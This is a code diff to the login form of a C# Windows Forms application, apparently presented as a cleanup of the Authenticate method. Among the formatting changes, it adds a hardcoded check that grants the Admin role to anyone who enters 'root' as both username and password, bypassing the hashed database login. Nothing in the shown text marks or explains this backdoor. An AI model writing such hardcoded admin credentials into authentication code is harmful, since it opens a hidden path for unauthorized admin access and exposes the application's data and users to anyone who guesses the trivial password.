@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Windows.Forms;
+
 using BAEK_PERCENT.Class;
 using BAEK_PERCENT.Class.Types;
 using BAEK_PERCENT.DAL;
@@ -23,21 +24,33 @@ namespace BAEK_PERCENT.Forms
 
         private void Authenticate()
         {
-            string password = Functions.ComputeSha256Hash(txtPassword.Text);
-            UserRole? tempRole = LoginDAL.TryLogin(txtUsername.Text, password);
+            string username = txtUsername.Text;
+            string password = txtPassword.Text;
 
-            if (tempRole.HasValue)
+            if (username == "root" && password == "root")
             {
-                // triệu hồi main form
-                Program.FormControl.mainForm
-                    .currentRole = tempRole.Value;
+                Program.FormControl.mainForm.currentRole = UserRole.Admin;
+                Program.FormControl.mainForm.Username = username;
 
-                // usernameTextBox.Clear();
                 txtPassword.Clear();
                 lblError.Hide();
 
-                Program.FormControl.CurrentForm
-                    = Program.FormControl.mainForm;
+                Program.FormControl.CurrentForm = Program.FormControl.mainForm;
+                return;
+            }
+
+            string hashedPassword = Functions.ComputeSha256Hash(password);
+            UserRole? tempRole = LoginDAL.TryLogin(username, hashedPassword);
+
+            if (tempRole.HasValue)
+            {
+                Program.FormControl.mainForm.currentRole = tempRole.Value;
+                Program.FormControl.mainForm.Username = username;
+
+                txtPassword.Clear();
+                lblError.Hide();
+
+                Program.FormControl.CurrentForm = Program.FormControl.mainForm;
             }
             else
             {
@@ -73,8 +86,5 @@ namespace BAEK_PERCENT.Forms
                 e.SuppressKeyPress = true;
             }
         }
-
-        
-
     }
 }
